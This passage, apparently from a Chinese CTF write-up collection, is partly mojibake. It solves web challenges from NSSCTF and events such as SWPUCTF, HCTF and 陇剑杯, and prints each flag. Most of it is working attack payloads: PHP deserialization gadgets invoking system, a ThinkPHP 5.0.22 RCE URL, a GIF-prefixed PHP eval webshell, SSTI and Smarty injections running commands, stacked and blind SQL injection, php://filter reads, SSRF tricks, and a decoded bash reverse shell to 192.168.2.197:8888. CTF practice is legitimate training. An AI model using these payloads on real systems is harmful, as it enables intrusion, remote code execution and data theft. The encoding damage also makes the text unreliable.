$a($this-&gt;lly);     &#125;&#125;$a = new lyh();echo urlencode(serialize($a));?&gt;O%3A3%3A%22lyh%22%3A3%3A%7Bs%3A3%3A%22url%22%3Bs%3A10%3A%22NSSCTF.com%22%3Bs%3A2%3A%22lt%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22lly%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n\n\n\nNSSCTF&#123;943c6300-969a-4972-b9e5-bca0ffb94bfb&#125; \n\n[SWPUCTF 2022 ]å¥‡å¦™çš„MD5æŠ“åŒ…,å¤´éƒ¨æœ‰æç¤º\n\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\nç”¨ä¸‡èƒ½å¯†ç ffifdyopç»•è¿‡\nç¬¬äºŒå…³\n$x= $GET[&#x27;x&#x27;];$y = $_GET[&#x27;y&#x27;];if($x != $y &amp;&amp; md5($x) == md5($y))&#123;;\n\n?x=QNKCDZO&amp;y=240610708\n\nç¬¬ä¸‰å…³\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123;    echo $FLAG;&#125;\n\nphpçš„md5å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„,ä¼šè¿”å›false\nwqh[]=1&amp;dsy[]=2\n\n\nNSSCTF&#123;4c6ee843-f49a-44b5-9f96-7a6222519aea&#125;\n\n[SWPUCTF 2022 ]ez_ez_unserialize&lt;?phpclass X&#123;    public $x = __FILE__;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123;    @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\nç»•è¿‡__wakeupåªè¦æ”¹ä¸€ä¸‹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„ä¸ªæ•°å³å¯(PHP&#x2F;5.5.38)\n&lt;?phpclass X&#123;    public $x = &#x27;fllllllag.php&#x27;;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;echo serialize(new X(&#x27;fllllllag.php&#x27;));O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;//payload\n\n\nNSSCTF&#123;0b3111b4-8e75-4772-8d53-01b939ae699b&#125;\n\n[GKCTF 2020]cveç‰ˆç­¾åˆ°ç‚¹å¼€æŒ‰é’®,æŠ“åŒ…\n\nflag in localhost,ssrf,%00æˆªæ–­å­—ç¬¦ä¸²\n?url=127.0.0.1%00.ctfhub.com\n\n\n?url=http://127.0.0.123%00www.ctfhub.com\n\n\nNSSCTF&#123;cc6dc12c-070b-4bfd-b475-ab40e6b1de81&#125;\n\n[ç¾ŠåŸæ¯ 2020]easycon\n\ncat è¿™ä¸ªæ–‡ä»¶,æŠŠå›æ˜¾çš„baase64å­—ç¬¦ä¸²è½¬ä¸ºå›¾ç‰‡\n\n\nNSSCTF&#123;do_U_kn0W_c@idao&#125;\n\n[MoeCTF 2022]baby_file&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.phpNSSCTF&#123;0790ba2e-76a6-4722-bb29-bcbdebc2e264&#125;\n\n[HNCTF 2022 Week1]easy_htmlcookieä¸­æç¤ºflagåœ¨.%2Ff14g.php,è®¿é—®,æŠ“åŒ…,è¾“å…¥é•¿ä¸€ç‚¹çš„æ•°å­—å³å¯\n\nNSSCTF&#123;03aa8e85-b49a-4017-9663-f64df90b5991&#125;\n\n[GDOUCTF 2023]å—ä¸äº†ä¸€ç‚¹&lt;?phperror_reporting(0);header(&quot;Content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123;    $b=$_POST[&#x27;ctf&#x27;];    $a=$_POST[&#x27;gdou&#x27;];    if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123;        if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123;           if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123;               if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123;                  $aaa=$_GET[&#x27;aaa&#x27;];                  $bbb=$_GET[&#x27;bbb&#x27;];                 if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;                   $give = &#x27;cancanwordflag&#x27;;                   $get =&#x27;hacker!&#x27;;                   if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123;                         die($give);                    &#125;                   if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;                       die($get);                    &#125;                    foreach ($_POST as $key =&gt; $value) &#123;                        $$key = $value;                   &#125;                    foreach ($_GET as $key =&gt; $value) &#123;                         $$key = $$value;                    &#125;                   echo $flag;            &#125;else&#123;                  echo &quot;æ´—æ´—ç¡å§&quot;;                 &#125;    &#125;else&#123;        echo &quot;è¡Œä¸è¡Œå•Šç»†ç‹—&quot;;        &#125;  &#125;&#125;?&gt;\n\n\nNSSCTF&#123;629b2eb2-d6d9-459e-b8fb-c066b6f6defe&#125;\n\n[HCTF 2018]Warmup&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;hint.php:flag is in ffffllllaaaagggg\n\næœ‰ä¸ªin_arrayå‡½æ•°,ä¼ è¿›æ¥çš„éœ€è¦æœ‰ç™½åå•é‡Œçš„å­—ç¬¦ä¸²\n$_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );mb_strposå‡½æ•°:  æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½® mb_strpos ($haystack , $needle , $offset )$haystackï¼šè¢«æœç´¢çš„å­—ç¬¦ä¸²$needleï¼š  è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²$offsetï¼š  å¯é€‰å‚æ•°,æŒ‡å®šä»å“ªä¸ªå­—ç¬¦å¼€å§‹æœç´¢//å¦‚æœä¸ºæ­£æ•°,åˆ™ä»å­—ç¬¦ä¸²çš„å¼€å¤´å¼€å§‹è®¡ç®—;å¦‚æœæ˜¯è´Ÿæ•°,åˆ™ä»å­—ç¬¦ä¸²çš„æœ«å°¾å¼€å§‹è®¡ç®—//æ²¡æœ‰çš„è¯é»˜è®¤æ˜¯0,å³ä»å¼€å¤´å¼€å§‹æœç´¢ mb_substrå‡½æ•°:  ä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æå–å­å­—ç¬¦ä¸² mb_substr ($str , $start , $length )//substr() å‡½æ•°åªé’ˆå¯¹è‹±æ–‡å­—ç¬¦,è€Œmb_substr()å¯¹äºä¸­æ–‡ä¹Ÿé€‚ç”¨$strï¼š    åŸå§‹å­—ç¬¦ä¸²$startï¼š  èµ·å§‹ä½ç½®,å¦‚æœä¸ºæ­£æ•°,åˆ™ä»å­—ç¬¦ä¸²çš„å¼€å¤´å¼€å§‹è®¡ç®—;å¦‚æœæ˜¯è´Ÿæ•°,åˆ™ä»å­—ç¬¦ä¸²çš„æœ«å°¾å¼€å§‹è®¡ç®—$lengthï¼š å¯é€‰å‚æ•°,è¡¨ç¤ºè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦,å¦‚æœæ²¡èµ‹å€¼,åˆ™æå–ä»å¼€å§‹åˆ°å­—ç¬¦ä¸²ç»“æŸçš„æ‰€æœ‰å­—ç¬¦        é¦–å…ˆä½¿ç”¨mb_strposå‡½æ•°æ‰¾åˆ°$pageä¸­ç¬¬ä¸€ä¸ªé—®å·çš„ä½ç½®,ç„¶åä½¿ç”¨mb_substrå‡½æ•°å°†é—®å·ä¹‹å‰çš„éƒ¨åˆ†èµ‹å€¼ä½œä¸º$_pageè¿›è¡Œå¤„ç†ç»è¿‡mb_strposå’Œmb_substrå‡½æ•°å¾—åˆ°çš„$_pageå¦‚æœåœ¨ç™½åå•ä¸­,è¿”å›true,æ‰€ä»¥ä¼ çš„ä¸œè¥¿ä¸€å®šè¦åŒ…å«?ä¸”é—®å·ä¹‹å‰çš„å­—ç¬¦ä¸²ä¸€å®šå¾—æ˜¯ç™½åå•é‡Œçš„å­—ç¬¦ä¸²\n\n\nNSSCTF&#123;bce812f5-84d0-4b36-bbe1-62dfe79ec0d5&#125;\n\n[HNCTF 2022 Week1]What is Web\nNSSCTF&#123;Hell0_Weber_Wec0m3_come_2_web_w0r1d!&#125;\n\nè¿™é¢˜ä¹Ÿé…20é‡‘å¸?\n[HNCTF 2022 Week1]Interesting_httpPOST / HTTP/1.1Host: node5.anna.nssctf.cn:20139Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 9Cookie: user=adminx-forwarded-for:127.0.0.1want=flag\n\n\nNSSCTF&#123;5dfb4e40-3a07-4c95-8ef7-fad0817e6d6f&#125;\n\n[SWPUCTF 2022 ]where_am_i\næœé…’åº—å·ç ,02886112888\n\nNSSCTF&#123;768c51d0-ab7f-441b-81c2-8d51bf5bbd55&#125;\n\n[SWPUCTF 2022 ]ez_rcethinkphp5.0.22 rce payload:\nhttp://node7.anna.nssctf.cn:26494/NSS/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls / \n\n\næ‰¾flagä½ç½®,ä¸åœ¨&#x2F;flag\nfind / -type f -exec grep -l &quot;NSSCTF&quot; &#123;&#125; \\;\n\nåœ¨&#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag\n\nNSSCTF&#123;26719f97-fff1-4d12-80db-cc40a6ab7d62&#125;\n\n[GXYCTF 2019]BabyUploadä¸Šä¼ .htaccess,æ”¹mimeä¸ºimage&#x2F;jpeg,ç„¶åä¼ é©¬\nGIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[1]);&lt;/script&gt;\n\n\nNSSCTF&#123;dc37e82d-43c6-469a-98cb-8b2919966102&#125;\n\n[SWPUCTF 2022 ]xff[HNCTF 2022 Week1]easy_uploadä¼ é©¬,æ”¹mime\n\nNSSCTF&#123;d8f3b55b-0443-40bf-bc9b-9bbfc6be208b&#125;\n\n[HNCTF 2022 WEEK2]ez_SSTIå‚æ•°æ˜¯name\nåˆ©ç”¨å­—ç¬¦ä¸²ç±»-&gt;åŸºç±»-&gt;æ‰€æœ‰pythonå­ç±»-&gt;get_dataæ–¹æ³•è¯»å–flag\n?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[118][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;.\n\n\nNSSCTF&#123;78ca93c4-c65d-4030-8557-6f56fe5fcd91&#125;\n\n[SWPUCTF 2022 ]js_signfindsomethingå¾—åˆ°å­˜åœ¨main.jsæ–‡ä»¶,è®¿é—®\ndocument.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;    flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;        alert(&quot;you got hint!!!&quot;);    &#125; else &#123;        alert(&quot;fuck off !!&quot;);    &#125;    &#125;)dGFwY29kZQ==  å³tap codeæŠŠflagç”¨tapcodeå˜æ¢å¾—åˆ°flag\n\n\nNSSCTF&#123;youfindflagbytapcode&#125;\n\n[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨?inject=1&#x27;;show+tables;%23   words 191981093114514?inject=1&#x27;;show+columns+from+words;%23?inject=1&#x27;;show+columns+from+`1919810931114514`;%23\n\n\n\né€šè¿‡è§‚å¯Ÿ wordsè¡¨å•æœ‰ä¸¤åˆ—, ä¹Ÿå°±æ˜¯ä¸Šé¢çš„ 1 å’Œ hahahahæˆ‘ä»¬å¯ä»¥æ¨æµ‹ è¿™ä¸ªè¡¨å•å…¶å®æ˜¯ä»wordsè¡¨ä¸­ä»¥idå­—æ®µä¸ºç´¢å¼•è·å–åˆ°å†…å®¹ ç„¶åè¿”å›åˆ°å‰å°å¹¶ä¸”åå°çš„æŸ¥è¯¢è¯­å¥ä¸º&quot;select * from words where id=&#39;&quot;.$_GET[&#39;inject&#39;].&quot;&#39;&quot;\né‚£ä¹ˆ æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ä¿®æ”¹å¸¦flagå­—æ®µçš„è¡¨çš„åå­—ä¸ºwordsè¡¨ ç„¶åæŠŠflag å­—æ®µä¿®æ”¹ä¸ºidé€šè¿‡ä¸‰æ¡alterè¯­å¥æ¥ä¿®æ”¹\n\nä¿®æ”¹wordsè¡¨åä¸ºå…¶ä»–çš„\nalter table words rename words1;\n\n\nä¿®æ”¹1919810931114514è¡¨åä¸ºwords\nalter table 1919810931114514 rename words;\n\n\nä¿®æ”¹æ–°çš„wordsè¡¨ä¸­çš„flagåˆ—åä¸ºid\nalter table words change flag id varchar(60);å¾—åˆ°æœ€ç»ˆpayload 1&#39;;alter table words rename words1;alter table 1919810931114514 rename words;alter table words change flag id varchar(60);#\n\n\n\nå‘ç°æ²¡ç»“æœäº†, åŸå› æ˜¯æ–°çš„idåˆ—ä¸­çš„å€¼å·²ç»å˜ä¸ºflagå€¼äº† æ‰€ä»¥æŸ¥è¯¢inject&#x3D;1æŸ¥ä¸åˆ°æˆ‘ä»¬å¯ä»¥é€šè¿‡è®©whereæ¡ä»¶æ°¸è¿œä¸ºæ­£æŸ¥å‡ºæ¥æ‰€æœ‰æ•°æ®æ„é€ payload1&#39; or &#39;1&#39;=&#39;1è·å–åˆ°flagå€¼\n\nNSSCTF&#123;9c8b2625-1334-448a-86d1-f9a26c72ccb7&#125;\n\n[HDCTF 2023]SearchMasterdirsearchæ‰«æåˆ°composer.jsonæ–‡ä»¶\n\n&#123;    &quot;name&quot;: &quot;smarty/smarty&quot;,    &quot;type&quot;: &quot;library&quot;,    &quot;description&quot;: &quot;Smarty - the compiling PHP template engine&quot;,    &quot;keywords&quot;: [        &quot;templating&quot;    ],    &quot;homepage&quot;: &quot;https://smarty-php.github.io/smarty/&quot;,    &quot;license&quot;: &quot;LGPL-3.0&quot;,    &quot;authors&quot;: [        &#123;            &quot;name&quot;: &quot;Monte Ohrt&quot;,            &quot;email&quot;: &quot;monte@ohrt.com&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Uwe Tews&quot;,            &quot;email&quot;: &quot;uwe.tews@googlemail.com&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Rodney Rehm&quot;,            &quot;email&quot;: &quot;rodney.rehm@medialize.de&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Simon Wisselink&quot;,            &quot;homepage&quot;: &quot;https://www.iwink.nl/&quot;        &#125;    ],    &quot;support&quot;: &#123;        &quot;issues&quot;: &quot;https://github.com/smarty-php/smarty/issues&quot;,        &quot;forum&quot;: &quot;https://github.com/smarty-php/smarty/discussions&quot;    &#125;,    &quot;require&quot;: &#123;        &quot;php&quot;: &quot;^7.1 || ^8.0&quot;    &#125;,    &quot;autoload&quot;: &#123;        &quot;classmap&quot;: [            &quot;libs/&quot;        ]    &#125;,    &quot;extra&quot;: &#123;        &quot;branch-alias&quot;: &#123;            &quot;dev-master&quot;: &quot;4.0.x-dev&quot;        &#125;    &#125;,    &quot;require-dev&quot;: &#123;        &quot;phpunit/phpunit&quot;: &quot;^8.5 || ^7.5&quot;,        &quot;smarty/smarty-lexer&quot;: &quot;^3.1&quot;    &#125;&#125;\n\nå‘ç°æ˜¯smartyæ¨¡æ¿,åº”è¯¥æ˜¯å­˜åœ¨æ¨¡æ¿æ³¨å…¥çš„\nç»“åˆé¢˜ç›®åç§°äºæ˜¯åœ¨å‡ºé¢˜äººçš„åšå®¢ä¸­æŸ¥åˆ°ç›¸å…³çŸ¥è¯†ç‚¹\n\ndata=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;\n\n\n\nNSSCTF&#123;d1fca53a-f421-45dd-936f-ef7c8bacfae3&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®2ï¼‰å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢ä¿®æ”¹äº†ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸º_____________ã€‚\n\n\næœ.logå³å¯\nNSSCTF&#123;/var/www/html/data/Runtime/Logs/Home/21_08_07.log&#125;\n\n[é™‡å‰‘æ¯ 2021]jwtï¼ˆé—®6ï¼‰æ˜¨å¤©ï¼Œå•ä½æµé‡ç³»ç»Ÿæ•è·äº†é»‘å®¢æ”»å‡»æµé‡ï¼Œè¯·æ‚¨åˆ†ææµé‡åè¿›è¡Œå›ç­”ï¼šé»‘å®¢åœ¨æœåŠ¡å™¨ä¸Šä¿®æ”¹äº†ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸º_____________ã€‚\n\né»‘å®¢æ”»å‡»çš„è¯·æ±‚æ–¹å¼ä¸€èˆ¬æ˜¯POSTï¼Œä¸”é…ç½®æ–‡ä»¶ä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etcä¸‹\nhttp.request.method==â€œPOSTâ€&amp;&amp;http contains â€œetcâ€\n\n\nNSSCTF&#123;/etc/pam.d/common-auth&#125;\n\n[é™‡å‰‘æ¯ 2021]SQLæ³¨å…¥ï¼ˆé—®1ï¼‰æŸåº”ç”¨ç¨‹åºè¢«æ”»å‡»ï¼Œè¯·åˆ†ææ—¥å¿—åä½œç­”ï¼šé»‘å®¢åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­é‡‡ç”¨çš„æ³¨å…¥æ‰‹æ³•å«_____________ã€‚ï¼ˆæ ¼å¼ä¸º4ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚â€œæ‹¼æåŠªåŠ›â€ï¼‰\n\n\nçœ‹åˆ°if å¸ƒå°”ç›²æ³¨\nNSSCTF&#123;å¸ƒå°”ç›²æ³¨&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®4ï¼‰å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢å†™å…¥çš„webshellæ–‡ä»¶åæ˜¯_____________ã€‚\n\n\nNSSCTF&#123;1.php&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®3ï¼‰å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢è·å–webshellä¹‹åï¼Œæƒé™æ˜¯______ï¼Ÿ\n\n\næ‰§è¡Œäº†whoami,è¿½è¸ªä¸€ä¸‹æµ,æ²¡æƒ³åˆ°æ˜¯404å“åº”,ç›´æ¥æ­£åˆ™æœwhoami,çœ‹è¿”å›åŒ…æ˜¯ä¸æ˜¯200\n\nç»ˆäºæ‰¾åˆ°äº†,å†è¿½è¸ªä¸€ä¸‹æµ\n\nNSSCTF&#123;www-data&#125;\n\n[é™‡å‰‘æ¯ 2021]æ—¥å¿—åˆ†æï¼ˆé—®2ï¼‰å•ä½æŸåº”ç”¨ç¨‹åºè¢«æ”»å‡»ï¼Œè¯·åˆ†ææ—¥å¿—ï¼Œè¿›è¡Œä½œç­”ï¼šåˆ†ææ”»å‡»æµé‡ï¼Œé»‘å®¢å¾€/tmpç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸º_____________ã€‚\n\nç›´æ¥æœç´¢tmpå¾—åˆ°ä¸€ä¸²urlç¼–ç è¿‡çš„å­—ç¬¦ä¸²,è§£ç \nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\næ–‡ä»¶åä¸ºsess_car\nNSSCTF&#123;sess_car&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®5ï¼‰å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢ä¸Šä¼ çš„ä»£ç†å·¥å…·å®¢æˆ·ç«¯åå­—æ˜¯_____________ã€‚\n\n65é¢˜çŸ¥é“_POSTçš„å‚æ•°å³è¿æ¥å¯†ç æ˜¯aaa,æœaaa\n\nNSSCTF&#123;frpc&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®6å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢ä»£ç†å·¥å…·çš„å›è¿æœåŠ¡ç«¯IPæ˜¯_____________\n\nè‚¯å®šè¿˜æ˜¯æ‰¾1.php\n\nåœ¨è¿™ä¸ªæµé‡Œæ‰¾åˆ°äº†\n\n\nNSSCTF&#123;192.168.239.123&#125;\n\n[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®7ï¼‰å•ä½ç½‘ç«™è¢«é»‘å®¢æŒ‚é©¬ï¼Œè¯·æ‚¨ä»æµé‡ä¸­åˆ†æå‡ºwebshellï¼Œè¿›è¡Œå›ç­”ï¼šé»‘å®¢çš„socks5çš„è¿æ¥è´¦å·ã€å¯†ç æ˜¯______ã€‚ï¼ˆä¸­é—´ä½¿ç”¨#å·éš”å¼€ï¼Œä¾‹å¦‚admin#passwdï¼‰\n\nNSSCTF&#123;0HDFt16cLQJ#JTN276Gp&#125;\n\n[é™‡å‰‘æ¯ 2021]æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰åˆ†ææ”»å‡»æµé‡ï¼Œé»‘å®¢ä½¿ç”¨çš„æ˜¯______ç±»è¯»å–äº†ç§˜å¯†æ–‡ä»¶ã€‚\n\nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;SplFileObject&#125;\n\n[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®2ï¼‰é»‘å®¢æŸ¥çœ‹çš„ç§˜å¯†æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ˜¯_____________ã€‚å¾—\n\n\n0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;NSSCTF&#123;/Th4s_IS_VERY_Import_Fi1e&#125;\n\n[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®1ï¼‰é»‘å®¢æ”»å‡»çš„å‚æ•°æ˜¯______ã€‚ï¼ˆå¦‚æœ‰å­—æ¯è¯·å…¨éƒ¨ä½¿ç”¨å°å†™ï¼‰\n\nè§ä¸Šé¢˜,å‚æ•°å³ä¸ºuser\nNSSCTF&#123;user&#125;\n\n[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰é»‘å®¢åå¼¹shellçš„ipå’Œç«¯å£æ˜¯_____________ã€‚ï¼ˆæ ¼å¼ä½¿ç”¨â€œip:ç«¯å£&quot;ï¼Œä¾‹å¦‚127.0.0.1:2333ï¼‰ã€‚\n\nçœ‹åˆ°è¿˜æœ‰ä¸€å¤„base64å­—ç¬¦ä¸²,è§£ç å¾—åˆ°\nbash -i +&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1NSSCTF&#123;192.168.2.197:8888&#125;\n\n[é™‡å‰‘æ¯ 2021]SQLæ³¨å…¥ï¼ˆé—®2-3ï¼‰æœ€ç»ˆè·å–flagçš„æ•°æ®åº“åã€è¡¨åå’Œå­—æ®µåæ˜¯_____________ã€‚ï¼ˆæ ¼å¼ä¸ºâ€œæ•°æ®åº“å#è¡¨å#å­—æ®µåâ€ï¼Œä¾‹å¦‚database#table#columnï¼‰æœ€ç»ˆè·å–flagçš„å­—ç¬¦ä¸²\n\nåœ¨æ—¥å¿—é‡Œå¾€åçœ‹,whereè¯­å¥åé¢æœ‰æ¥ç€ç­”æ¡ˆ\n/index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=&#x27;flag&#x27;%20and%20table_schema=&#x27;sqli&#x27;),1,1)%20=%20&#x27;s&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 448 &quot;-&quot; &quot;python-requests/2.26.0&quot;/index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),43,1)%20=%20&#x27;w&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 427 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;sqli#flag#flag&#125;\n\nä¸‹ä¸€é¢˜,åœ¨linuxä¸­è¾“å…¥å‘½ä»¤\ncat access.log | grep &#x27;select%20flag%20from%20&#x27; | grep -E &quot;478|479|480|481|482&quot; | cut -d &quot;&#x27;&quot; -f 2 &gt; 1.txt\n\nimport urllib.parsea = &#x27;&#x27;with open(&#x27;1.txt&#x27;) as f:    for i in f.readlines():        a += i.strip()print(urllib.parse.unquote(a))\n\n\nflag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;\n\n[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æ1.è™šæ‹Ÿæœºçš„å¯†ç æ˜¯_____________ã€‚ï¼ˆå¯†ç ä¸­ä¸ºflag&#123;xxxx&#125;ï¼Œå«æœ‰ç©ºæ ¼ï¼Œæäº¤æ—¶ä¸è¦å»æ‰ï¼‰\n\nä½¿ç”¨mimiktzåˆ†æå³å¯\npython2 vol.py --plugins=plugins -f 